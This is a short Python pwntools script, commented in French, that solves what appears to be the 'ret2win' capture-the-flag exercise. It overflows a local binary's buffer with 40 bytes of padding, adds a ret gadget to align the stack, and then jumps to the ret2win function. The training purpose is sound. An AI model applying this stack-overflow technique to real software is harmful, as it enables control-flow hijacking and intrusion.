#!/usr/bin/env python3
from pwn import *

context.binary = './ret2win'

ret2win_addr = 0x400756
offset = 40

# On met un ret gadget avant pour aligner la stack
ret_gadget = 0x40053e  # Un simple "ret" trouvé dans le binaire

payload = flat([
    b'A' * offset,
    ret_gadget,      # 1. exécute ret (décale RSP)
    ret2win_addr     # 2. puis jump à ret2win avec stack propre
])

io = process('./ret2win')
io.sendline(payload)
print(io.recvall().decode())
